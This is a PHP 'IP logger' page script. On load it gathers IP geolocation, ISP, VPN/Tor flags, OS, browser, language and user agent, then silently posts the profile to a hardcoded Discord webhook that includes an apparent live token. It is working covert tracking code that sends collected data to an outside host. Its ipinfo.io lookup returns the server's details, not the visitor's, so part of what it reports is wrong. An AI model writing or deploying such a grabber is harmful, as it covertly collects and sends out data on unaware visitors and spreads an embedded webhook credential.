<?php
// DISCORD WEBHOOK
$webhookurl = "https://discord.com/api/webhooks/1295529347637055590/FO0C7KQJhZvUi7bhpjAZ2afMKbcpF34vKU19QA2omnKwFzTchgUhnBlTivPk6t87Sst8";

$ip_api_url = "https://ipinfo.io/json";
$ip_response = file_get_contents($ip_api_url);
$ip_data = json_decode($ip_response, true);

$user_ip = $ip_data['ip'] ?? 'Unknown IP';
$hostname = $ip_data['hostname'] ?? 'Unknown Hostname';
$city = $ip_data['city'] ?? 'Unknown City';
$region = $ip_data['region'] ?? 'Unknown Region';
$country = $ip_data['country'] ?? 'Unknown Country';
$loc = $ip_data['loc'] ?? 'Unknown Location';
$org = $ip_data['org'] ?? 'Unknown Organization';
$postal = $ip_data['postal'] ?? 'Unknown Postal Code';
$timezone = $ip_data['timezone'] ?? 'Unknown Timezone';

$asn = $ip_data['asn']['asn'] ?? 'Not Provided';
$asn_name = $ip_data['asn']['name'] ?? 'Not Provided';
$asn_domain = $ip_data['asn']['domain'] ?? 'Not Provided';
$route = $ip_data['asn']['route'] ?? 'Not Provided';

$company_name = $ip_data['company']['name'] ?? 'Not Provided';
$company_domain = $ip_data['company']['domain'] ?? 'Not Provided';

$privacy_vpn = isset($ip_data['privacy']['vpn']) ? ($ip_data['privacy']['vpn'] ? 'Yes' : 'No') : 'Unknown';
$privacy_proxy = isset($ip_data['privacy']['proxy']) ? ($ip_data['privacy']['proxy'] ? 'Yes' : 'No') : 'Unknown';
$privacy_tor = isset($ip_data['privacy']['tor']) ? ($ip_data['privacy']['tor'] ? 'Yes' : 'No') : 'Unknown';

$abuse_address = $ip_data['abuse']['address'] ?? 'Not Provided';
$abuse_country = $ip_data['abuse']['country'] ?? 'Not Provided';
$abuse_email = $ip_data['abuse']['email'] ?? 'Not Provided';
$abuse_name = $ip_data['abuse']['name'] ?? 'Not Provided';
$abuse_network = $ip_data['abuse']['network'] ?? 'Not Provided';

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date("Y-m-d H:i:s");
$language = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown Language';

function getOS($user_agent) {
    $os_platform = "Unknown OS";
    $os_array = [
        '/windows nt 10/i'     =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
    ];
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }
    return $os_platform;
}

function getBrowser($user_agent) {
    $browser = "Unknown Browser";
    if (preg_match('/opr\//i', $user_agent) || preg_match('/opera/i', $user_agent)) {
        $browser = 'Opera';
    } elseif (preg_match('/edg/i', $user_agent)) {
        $browser = 'Edge';
    } elseif (preg_match('/firefox/i', $user_agent)) {
        $browser = 'Firefox';
    } elseif (preg_match('/chrome/i', $user_agent) && !preg_match('/edg/i', $user_agent) && !preg_match('/opr\//i', $user_agent)) {
        $browser = 'Chrome';
    } elseif (preg_match('/safari/i', $user_agent) && !preg_match('/chrome/i', $user_agent)) {
        $browser = 'Safari';
    }
    return $browser;
}

$user_os = getOS($user_agent);
$user_browser = getBrowser($user_agent);

$message = "
## **General Details**
- **IP Address:** `$user_ip`
- **Hostname:** `$hostname`
- **City:** `$city`
- **Region:** `$region`
- **Country:** `$country`
- **Location (lat, long):** `$loc`
- **Organization:** `$org`
- **Postal Code:** `$postal`
- **Timezone:** `$timezone`

## **ASN and ISP Details**
- **ASN:** `$asn`
- **ASN Name:** `$asn_name`
- **ASN Domain:** `$asn_domain`
- **Route:** `$route`
- **Company Name:** `$company_name`
- **Company Domain:** `$company_domain`

## **Privacy Indicators**
- **Using VPN:** `$privacy_vpn`
- **Using Proxy:** `$privacy_proxy`
- **Using Tor:** `$privacy_tor`

## **Abuse Contact**
- **Abuse Address:** `$abuse_address`
- **Abuse Country:** `$abuse_country`
- **Abuse Email:** `$abuse_email`
- **Abuse Name:** `$abuse_name`
- **Abuse Network:** `$abuse_network`

## **System Details**
- **Operating System:** `$user_os`
- **Browser:** `$user_browser`
- **Language:** `$language`
- **User-Agent:** `$user_agent`
- **Timestamp:** `$timestamp`
";

$data = ["content" => $message];
$json_data = json_encode($data);

$ch = curl_init($webhookurl);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec($ch);
curl_close($ch);
?>